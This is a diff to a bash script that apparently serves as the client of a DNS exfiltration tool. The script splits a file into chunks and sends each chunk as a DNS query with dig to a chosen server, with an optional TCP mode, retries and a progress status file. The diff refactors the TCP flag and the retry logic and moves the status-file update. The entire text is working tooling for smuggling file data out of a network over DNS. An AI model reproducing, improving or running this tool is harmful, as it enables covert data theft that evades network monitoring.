@@ -23,7 +23,7 @@ while getopts "f:p:d:s:th" opt; do
     p) Password=$OPTARG ;;
     d) Domain=$OPTARG ;;
     s) DnsServerIp=$OPTARG ;;
-    t) UseTcp=true ;;
+    t) tcp="+tcp" ;;
     h)
         show_help
         exit 0
@@ -129,13 +129,7 @@ while [[ $chunk_id -lt $nb_chunks ]]; do
     success=false
 
     while [[ $retry_count -lt $max_retries && $success == false ]]; do
-        if [[ "$UseTcp" = true ]]; then
-            dig_output=$(dig +tcp +short "$dnsquery" @"$DnsServerIp" 2>&1)
-        else
-            dig_output=$(dig +short "$dnsquery" @"$DnsServerIp" 2>&1)
-        fi
-
-        if [[ ! "$dig_output" == *"connection refused"* ]]; then
+        if dig $tcp +short "$dnsquery" @"$DnsServerIp" >/dev/null 2>&1; then
             success=true
         else
             retry_count=$((retry_count + 1))
@@ -144,15 +138,15 @@ while [[ $chunk_id -lt $nb_chunks ]]; do
         fi
     done
 
-    # Update status file
-    status=$(jq -n --arg chunk_id "$chunk_id" --arg randnum "$randnum" --arg file "$filename" --arg md5_checksum "$md5_checksum" \
-        '{chunk_id: $chunk_id, randnum: $randnum, file: $file, md5_checksum: $md5_checksum}')
-    echo "$status" >"$status_file"
-
     if [[ $success == false ]]; then
         echo "[!] Failed to send DNS query after multiple retries."
         exit 1
     fi
+
+    # Update status file
+    status=$(jq -n --arg chunk_id "$chunk_id" --arg randnum "$randnum" --arg file "$filename" --arg md5_checksum "$md5_checksum" \
+        '{chunk_id: $chunk_id, randnum: $randnum, file: $file, md5_checksum: $md5_checksum}')
+    echo "$status" >"$status_file"
 
     printf "%4d%%\r" $((100 * chunk_id / nb_chunks))
 
